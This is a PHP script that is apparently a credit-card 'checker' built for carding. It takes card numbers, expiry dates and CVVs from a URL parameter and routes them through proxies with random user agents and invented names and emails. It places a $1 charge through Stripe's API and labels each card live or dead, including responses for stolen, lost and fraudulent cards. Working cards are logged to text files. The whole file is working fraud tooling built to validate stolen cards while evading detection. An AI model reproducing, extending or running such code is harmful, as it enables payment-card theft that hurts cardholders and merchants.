<?php

ob_start();

#---///Credits\\\---#

$credits = "【★𝗛𝗡★】"; /// PUT YOUR NAME

error_reporting(0);
// date_default_timezone_set('America/Buenos_Aires');
date_default_timezone_set('America/New_York');

if (file_exists(getcwd().'/cookie.txt')) {
    @unlink('cookie.txt');
}


#--- Stripe Key Input ---#
$stripe_secret = "sk_live_"; // <-- INSERT YOUR STRIPE SECRET KEY HERE

$stripe_pk_key ="pk_live_s";
#---///[START]\\\---#



function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

// Function to generate a random payment description
function getRandomPaymentDescription($user = 'user') {
    $hash = strtoupper(bin2hex(random_bytes(4))); // 8 hex chars
    return $user . " " . $hash;
}

$lista = $_GET['lista'];
preg_match_all("/([\d]+\d)/", $lista, $list);
$cc = $list[0][0];
$mes = $list[0][1];
$ano = $list[0][2];
$cvv = $list[0][3];

if (empty($lista)) {
    echo '[♻️] Status: #Error ️⚠

[📡] Response:『 ★ Bete Enter Your CC First ★ 』

[💻] Bot Made By: '.$credits.'';
die();
};

// $cc1 = substr($cc,0,4);
// $cc2 = substr($cc,4,4);
// $cc3 = substr($cc,8,4);
// $cc4 = substr($cc,12,4);


// if (strlen($cc) == 16){
// $cc1 = substr($cc,0,4);
// $cc2 = substr($cc,4,4);
// $cc3 = substr($cc,8,4);
// $cc4 = substr($cc,12,4);
// $cc_main = $cc1."+".$cc2."+".$cc3."+".$cc4;
// }
// elseif(strlen($cc) == 15){
//     $cc1 = substr($cc,0,4);
//     $cc2 = substr($cc,4,6);
//     $cc3 = substr($cc,10,5);
//     $cc_main = $cc1."+".$cc2."+".$cc3;
// }
// echo "cc main is:- ".$cc_main;

if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 4) { 
  $ano = str_replace("20","",$ano); 
}

$hex_digits = '0123456789abcdef';
function random_hex($length) {
    $result = '';
    for ($i = 0; $i < $length; $i++) {
        $result .= $GLOBALS['hex_digits'][rand(0, 15)];
    }
    return $result;
}
$payment_user_agent = "stripe.js/".random_hex(10)."; stripe-js-v3/".random_hex(10)."; checkout";



#---///Random Personal Details\\\---#
$names      = ['Ashish', 'John', 'Emily', 'Michael', 'Olivia', 'Daniel', 'Sophia','Matthew', 'Ava', 'William', 'Lilly', 'Laura', 'Robert','Isabella', 'Ethan', 'Grace', 'James', 'Chloe', 'Benjamin', 'Mia', 'Alexander', 'Alice', 'Jack', 'Charlotte', 'Luke', 'Ella','Ryan', 'Amelia', 'Charlie', 'Sophie', 'Owen', 'Lucy', 'Dylan', 'Ruby', 'Logan', 'Eva'];
$last_names = ['Mishra', 'Smith', 'Johnson', 'Brown', 'Williams', 'Jones', 'Miller', 'Davis', 'Garcia', 'Rodriguez', 'Martinez', 'Jose', 'Wilson', 'Anderson', 'Taylor', 'Thomas', 'Hernandez', 'Moore', 'Martin', 'Jackson', 'Lee', 'Perez', 'White', 'Harris', 'Clark', 'Lewis', 'Robinson', 'Walker', 'Allen', 'Young', 'King', 'Scott', 'Green', 'Adams', 'Baker', 'Gonzalez'];
$name       = ucfirst($names[array_rand($names)]);
$last       = ucfirst($last_names[array_rand($last_names)]);
$fullName   = $name . ' ' . $last;
$email_domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'];
$randomDomain = $email_domains[array_rand($email_domains)];
$mail = strtolower($name) . strtolower($last) . rand(1000,9999) . '@' . $randomDomain;


$proxies = [
'proxyadr:port:uname:pwd'
];

$randomProxy = $proxies[array_rand($proxies)];
list($plink, $pport, $puser, $ppass) = explode(':', $randomProxy);

#--- Get proxy IP to show on page
$ch = curl_init('https://api.ipify.org/');
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_PROXY => "http://$plink:$pport",
    CURLOPT_PROXYUSERPWD => "$puser:$ppass",
    CURLOPT_HTTPGET => true,
]);
$ip1 = curl_exec($ch);
$time0 = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
curl_close($ch);
ob_flush();
if (isset($ip1)) {
    $ip = "Proxy Live ($ip1) ✅";
} else {
    $ip = "Proxy Dead ❌";
}
echo '[IP: '.$ip.']<br>';

//--- Prepare user agent
$userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.4 Safari/605.1.15',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 15_6 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36'
];
// Select a random user agent from the array
$randomUserAgent = $userAgents[array_rand($userAgents)];

#--- Prepare random description for payment intent
$paymentDescription = getRandomPaymentDescription($fullName);

#---///[If Error Retry]\\\---#
$retry = 0;
start:

// Step 1: Create Stripe Payment Method -- use proxy, random UA as in original code
$ch = curl_init('https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_PROXY, "http://$plink:$pport");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$puser:$ppass");
curl_setopt($ch, CURLOPT_USERPWD, $stripe_pk_key.':');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/x-www-form-urlencoded',
    'User-Agent: '.$randomUserAgent
]);
$postfields = http_build_query([
    'type' => 'card',
    'card[number]' => $cc,
    'card[exp_month]' => $mes,
    'card[exp_year]' => $ano,
    'card[cvc]' => $cvv,
    // 'billing_details[name]' => $fullName,
    'billing_details[email]' => $mail,
    // 'payment_user_agent' => $payment_user_agent
    'payment_user_agent' => 'stripe.js/0eddba596b; stripe-js-v3/0eddba596b; checkout'



]);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postfields);
$payment_method_response = curl_exec($ch);
curl_close($ch);

$pm_data = json_decode($payment_method_response, true);
$payment_method_id = $pm_data['id'] ?? "";

// echo "<br><b>PM RESPONSE:</b> $payment_method_response<br><br>";



// if (!$payment_method_id) {
//     if (++$retry < 3) goto start;
//     echo 'Status: #Dead ❌<br>
//     CC: '.$lista.'<br>
//     Response:『 ★ Payment Method Creation Failed ★ 』<br>
//     PM Resp: '.htmlspecialchars($payment_method_response).'<br>
//     Gate: Stripe SK Based $1<br>
//     ';
//     return;
// }

// Step 2: Create PaymentIntent for $1 charge using the payment method
$ch = curl_init('https://api.stripe.com/v1/payment_intents');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_PROXY, "http://$plink:$pport");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$puser:$ppass");
curl_setopt($ch, CURLOPT_USERPWD, $stripe_secret.':');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/x-www-form-urlencoded',
    'User-Agent: '.$randomUserAgent
]);
$postfields = http_build_query([
    'amount' => 100, // $1 in cents
    'currency' => 'usd',
    'payment_method' => $payment_method_id,
    'confirm' => 'true',
    'description' => $paymentDescription,   // use the generated random description here
    'receipt_email' => $mail,
    'automatic_payment_methods[enabled]' => 'true',
    'automatic_payment_methods[allow_redirects]' => 'never',
    // 'return_url' => 'https://www.medium.com',
    'expand[]' => 'latest_charge'
    // 'expand' => ['charges.data', 'charges.data.outcome']
    

]);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postfields);
$pi_response = curl_exec($ch);
curl_close($ch);

// echo "<br><b>PI RESPONSE:</b> $pi_response<br><br>";

// --- Handle Stripe API response
if (empty($pi_response)) {
    if (++$retry < 3) goto start;
    echo 'Status: #Dead ❌<br>
    CC: '.$lista.'<br>
    Response:『 ★ No Response from Stripe API ★ 』<br>
    Gate: Stripe SK Based $1<br>
    ';
    return;
}

$pi_data = json_decode($pi_response, true);

if (empty($pi_data)) {
    if (++$retry < 3) goto start;
    echo 'Status: #Dead ❌<br>
    CC: '.$lista.'<br>
    Response:『 ★ Invalid JSON from Stripe API ★ 』<br>
    Full: '.htmlspecialchars($pi_response).'<br>
    Gate: Stripe SK Based $1<br>
    ';
    return;
}



$status = $pi_data['status'] ?? '';
$requires_action = $pi_data['next_action']['type'] ?? '';
$error_msg = $pi_data['error']['decline_code'] ?? ($pi_data['last_payment_error']['message'] ?? '');

#charge req
if ($status !== "succeeded") {
    $chargeId = $pi_data['error']['charge']; // "ch_..."
    $ch = curl_init("https://api.stripe.com/v1/charges/$chargeId");
    curl_setopt_array($ch, [
      CURLOPT_RETURNTRANSFER => 1,
      CURLOPT_USERPWD => $stripe_secret . ':',
      CURLOPT_HTTPHEADER => [
        'Content-Type: application/x-www-form-urlencoded',
        'User-Agent' => $randomUserAgent
      ],
      CURLOPT_PROXY => "http://$plink:$pport",
      CURLOPT_PROXYUSERPWD => "$puser:$ppass",
    ]);
    $charge_response = curl_exec($ch);
    $charge_data = json_decode($charge_response, true);
    $risk_level = $charge_data['outcome']['risk_level'] ?? null;
    curl_close($ch);
    // echo "<br><b>CHARGE RESPONSE:</b> $charge_response<br><br>";
    // echo "<br><b>CHARGE DATA:</b> $charge_data<br><br>";
}

// $outcome      = $charge['outcome']       ?? null;  // contains risk_level, risk_score*, etc.
// $fraudDetails = $charge['fraud_details'] ?? null; 

#-----[CVV Charged Response]-----#
if($status === "succeeded") {
    $receipt_url = $pi_data['charges']['data'][0]['receipt_url'] ?? null;
    $risk_level = $pi_data['charges']['data'][0]['outcome']['risk_level'] ?? null;
    echo 'Status: #Aprovadas ✅<br>
    CC: '.$lista.'<br>
    Response:『 ★ CVV LIVE (1$ CHARGED) ★ 』<br>
    Risk Level: '.$risk_level.'<br>
    Receipt URL: '.$receipt_url.'<br>
    Gate: Stripe SK Based $1<br>';
    file_put_contents('charged.txt', $lista.PHP_EOL , FILE_APPEND | LOCK_EX);
    file_put_contents('success.txt', $lista.$pi_response.PHP_EOL , FILE_APPEND | LOCK_EX);
    return;
}
elseif($requires_action == "use_stripe_sdk" || (isset($pi_data['next_action']) && $status === "requires_action")) {
    echo 'Status: #Dead ❌<br>
    CC: '.$lista.'<br>
    Response:『 ★ 3DS REQUIRED ★ 』<br>
    Risk Level: '.$risk_level.'<br>
    Gate: Stripe SK Based $1<br>';
    // ob_flush();
    @unlink('cookie.txt');
    return;
}
elseif (
    strpos($error_msg, 'insufficient_funds') !== false ||
    strpos($error_msg, 'insufficient funds') !== false
) {
    echo 'Status: #Aprovadas ✅<br>
    CC: '.$lista.'<br>
    Response:『 ★ INSUFFICIENT FUNDS ★ 』<br>
    Risk Level: '.$risk_level.'<br>
    Gate: Stripe SK Based $1<br>';
    // ob_flush();
    @unlink('cookie.txt');
    return;
}
elseif (
    strpos($error_msg, 'do_not_honor') !== false ||
    strpos($error_msg, 'do not honor') !== false
) {
    echo 'Status: #Dead ❌<br>
    CC: '.$lista.'<br>
    Response:『 ★ DO NOT HONOR ★ 』<br>
    Risk Level: '.$risk_level.'<br>
    Gate: Stripe SK Based $1<br>';
    return;
}
elseif (
    strpos($error_msg, 'stolen_card') !== false ||
    strpos($error_msg, 'stolen card') !== false
) {
    echo 'Status: #Dead ❌<br>
    CC: '.$lista.'<br>
    Response:『 ★ STOLEN CARD ★ 』<br>
    Risk Level: '.$risk_level.'<br>
    Gate: Stripe SK Based $1<br>';
    return;
}
elseif (
    strpos($error_msg, 'lost_card') !== false ||
    strpos($error_msg, 'lost card') !== false
) {
    echo 'Status: #Dead ❌<br>
    CC: '.$lista.'<br>
    Response:『 ★ LOST CARD ★ 』<br>
    Risk Level: '.$risk_level.'<br>
    Gate: Stripe SK Based $1<br>';
    return;
}
elseif (
    strpos($error_msg, 'expired_card') !== false ||
    strpos($error_msg, 'expired card') !== false ||
    strpos($error_msg, 'expired') !== false
) {
    echo 'Status: #Dead ❌<br>
    CC: '.$lista.'<br>
    Response:『 ★ EXPIRED CARD ★ 』<br>
    Risk Level: '.$risk_level.'<br>
    Gate: Stripe SK Based $1<br>';
    return;
}

elseif (
    strpos($error_msg, 'fraudulent') !== false
) {
    echo 'Status: #Dead ❌<br>
    CC: '.$lista.'<br>
    Response:『 ★ FRAUDULENT CARD ★ 』<br>
    Risk Level: '.$risk_level.'<br>
    Gate: Stripe SK Based $1<br>';
    return;
}

elseif (
    strpos($error_msg, 'incorrect_cvc') !== false ||
    strpos($error_msg, 'security code is incorrect') !== false ||
    strpos($error_msg, 'incorrect cvc') !== false ||
    strpos($error_msg, 'invalid_cvc') !== false
) {
    echo 'Status: #Aprovadas ✅<br>
    CC: '.$lista.'<br>
    Response:『 ★ Incorrect CVC ★ 』<br>
    Risk Level: '.$risk_level.'<br>
    Gate: Stripe SK Based $1<br>';
    return;
}


elseif (
    strpos($error_msg, 'generic_decline') !== false
) {
    echo 'Status: #Dead ❌<br>
    CC: '.$lista.'<br>
    Response:『 ★ Generic Decline ★ 』<br>
    Risk Level: '.$risk_level.'<br>
    Gate: Stripe SK Based $1<br>';
    return;
}


elseif (
    strpos($error_msg, 'card_declined') !== false ||
    strpos($error_msg, 'declined') !== false ||
    strpos($error_msg, 'your card was declined') !== false
) {
    echo 'Status: #Dead ❌<br>
    CC: '.$lista.'<br>
    Response:『 ★ DECLINED ★ 』<br>
    Risk Level: '.$risk_level.'<br>
    Gate: Stripe SK Based $1<br>';
    // return;
} else {
    echo 'Status: #Dead ❌<br>
    CC: '.$lista.'<br>
    Response:『 ★ Unknown or Custom Error: '.htmlspecialchars($error_msg ? $error_msg : json_encode($pi_data)).' ★ 』<br>
    Risk Level: '.$risk_level.'<br>
    Gate: Stripe SK Based $1<br>';
    file_put_contents('error.txt', $lista . $pi_response . PHP_EOL , FILE_APPEND | LOCK_EX);
    // ob_flush();
    
    // return;
}

// Show debug for dev if needed:
echo "<br><b>RESULT</b><br><br>";
echo "<br><b>PM RESPONSE:</b> $payment_method_response<br><br>";
echo "<br><b>PI RESPONSE:</b> $pi_response<br><br>";

ob_flush();


#---///[THE END]\\\---#
@unlink('cookie.txt');
// sleep(2);

?>